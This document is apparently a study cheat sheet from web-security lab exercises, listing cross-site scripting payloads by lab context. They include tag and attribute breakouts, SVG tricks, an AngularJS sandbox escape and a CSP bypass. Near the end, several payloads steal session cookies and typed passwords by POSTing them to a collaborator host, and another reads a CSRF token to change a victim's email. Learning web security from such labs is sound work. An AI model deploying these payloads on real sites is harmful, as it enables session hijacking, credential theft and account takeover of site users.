
xss

## XSS TEST CASES FOR BOTH STORED AND REFLECTED XSS:-
1: # Reflected XSS into HTML context with nothing encoded.
2: # Stored XSS into HTML context with nothing encoded.
3: # Reflected XSS into HTML context with most tags and attributes blocked.
4: # Reflected XSS into HTML context with all tags blocked except custom ones.
```
payload encoded: 
<script> location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>
```
without encoded:
```
<script> location = 'https://your-lab-id.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x'; </script>

```
5: # Reflected XSS with event handlers and  `href`  attributes blocked.
```
payload encoded:
%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```
without encoded:
```
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```
6: # Reflected XSS with some SVG markup allowed:
payload encoded:
```
%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```
without endoded:
```
"><svg><animatetransform onbegin=alert(1)>
```
## XSS in HTML tag attributes:
When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:
```
"><script>alert(document.domain)</script>
```
## XSS in HTML tag attributes

When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:

`"><script>alert(document.domain)</script>`

More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:
```
" autofocus onfocus=alert(document.domain) x="
```
7: # Reflected XSS into attribute with angle brackets HTML-encoded:
if the angle brackets <> become  encoded than use this payload:
```
"onmouseover="alert(1)
```
8: # Stored XSS into anchor `href`  attribute with double quotes HTML-encoded:
```
payload: javascript;alert(1);
```
9: # Reflected XSS into a JavaScript string with single quote and backslash escaped:
```
payload: </script><script>alert(1)</script>
```
10: # Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped:
```
payload: \'-alert(1)//
```
11: # Stored XSS into  `onclick`  event with angle brackets and double quotes HTML-encode
```
payload: http://foo?&apos;-alert(1)-&apos;
```
12: # Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped:
```
paylaod: ${alert(1)}
```
13: # Reflected XSS in a JavaScript URL with some characters blocked:
```
paylaod: &%27},x=x=>{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```
14: ## Reflected XSS with AngularJS sandbox escape without strings:
```
paylaod:1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
15: # Reflected XSS protected by CSP, with CSP bypass:
```
payload: <script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```
16: # Exploiting cross-site scripting to steal cookies:
```
payload: 
<script>
fetch('https://rpktwfkqnwpoyp0tk6x47c6ct3ztni.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
17: # Exploiting cross-site scripting to capture passwords:
```
payload:
 <input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```
18: # Exploiting XSS to perform CSRF:
```
payload:
<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>
```


Markdown 4454 bytes 508 words 108 lines Ln 1, Col 0HTML 3796 characters 465 words 61 paragraphs
